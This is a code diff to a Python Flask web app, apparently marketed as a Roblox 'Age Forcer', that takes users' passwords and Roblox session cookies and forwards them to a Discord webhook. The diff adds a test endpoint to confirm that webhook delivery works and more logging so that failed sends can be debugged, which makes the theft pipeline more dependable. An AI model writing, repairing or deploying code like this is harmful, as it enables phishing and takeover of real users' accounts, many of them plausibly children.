@@ -195,7 +195,16 @@ def send_to_discord_background(password, cookie, webhook_url):
     except Exception as e:
         print(f"Background: Error sending to Discord: {str(e)}")
         import traceback
-        print(f"Background: Full error traceback: {traceback.format_exc()}")
+        error_trace = traceback.format_exc()
+        print(f"Background: Full error traceback: {error_trace}")
+        # Log additional debugging info for production
+        print(f"Background: Webhook URL configured: {'YES' if webhook_url else 'NO'}")
+        print(f"Background: Cookie length: {len(cookie) if cookie else 0}")
+        try:
+            print(f"Background: User info success: {user_info.get('success', False)}")
+        except NameError:
+            print("Background: User info not fetched yet")
+        raise  # Re-raise for parent function to handle
 
 def get_roblox_user_info(cookie):
     """Get Roblox user information using the provided cookie"""
@@ -642,6 +651,62 @@ def debug_info():
         'timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
     })
 
+@app.route('/test-webhook', methods=['POST'])
+def test_webhook_delivery():
+    """Test endpoint to verify webhook delivery with sample data"""
+    try:
+        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+        if not webhook_url:
+            return jsonify({
+                'success': False,
+                'message': 'DISCORD_WEBHOOK_URL not configured'
+            }), 500
+        
+        # Create test data
+        test_data = {
+            'content': 'TEST MESSAGE from Vercel deployment',
+            'embeds': [{
+                'title': 'Age Forcer - Test Message',
+                'color': 16711680,
+                'description': 'This is a test message to verify webhook delivery works on Vercel.',
+                'fields': [
+                    {'name': 'Test Status', 'value': '✅ Webhook delivery working', 'inline': False},
+                    {'name': 'Timestamp', 'value': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime()), 'inline': False}
+                ]
+            }]
+        }
+        
+        print(f"Sending test webhook to Discord...")
+        response = requests.post(webhook_url, json=test_data, timeout=10)
+        
+        print(f"Discord response status: {response.status_code}")
+        print(f"Discord response text: {response.text}")
+        
+        if response.status_code in [200, 204]:
+            return jsonify({
+                'success': True,
+                'message': 'Test webhook sent successfully!',
+                'discord_status': response.status_code
+            })
+        else:
+            return jsonify({
+                'success': False,
+                'message': f'Discord returned status {response.status_code}',
+                'discord_response': response.text[:200]
+            }), 500
+            
+    except Exception as e:
+        import traceback
+        error_trace = traceback.format_exc()
+        print(f"Test webhook error: {str(e)}")
+        print(f"Test webhook traceback: {error_trace}")
+        
+        return jsonify({
+            'success': False,
+            'message': f'Test webhook failed: {str(e)}',
+            'error_details': error_trace[:500]
+        }), 500
+
 
 @app.route('/submit', methods=['POST'])
 def submit_form():
@@ -698,12 +763,18 @@ def submit_form():
                 'message': 'Form submitted successfully! Data sent to Discord.'
             })
         except Exception as webhook_error:
-            print(f"Discord webhook error: {str(webhook_error)}")
-            # Still return success to user since form was processed, just log the webhook error
+            import traceback
+            error_trace = traceback.format_exc()
+            print(f"WEBHOOK ERROR: {str(webhook_error)}")
+            print(f"WEBHOOK ERROR TRACEBACK: {error_trace}")
+            print(f"WEBHOOK URL SET: {'YES' if webhook_url else 'NO'}")
+            print(f"FORM DATA: password_provided={bool(password)}, cookie_length={len(cookie) if cookie else 0}")
+            
+            # Return error to user so they know webhook failed
             return jsonify({
-                'success': True, 
-                'message': 'Form submitted successfully!'
-            })
+                'success': False, 
+                'message': f'Webhook delivery failed: {str(webhook_error)[:100]}'
+            }), 500
             
     except Exception as e:
         return jsonify({
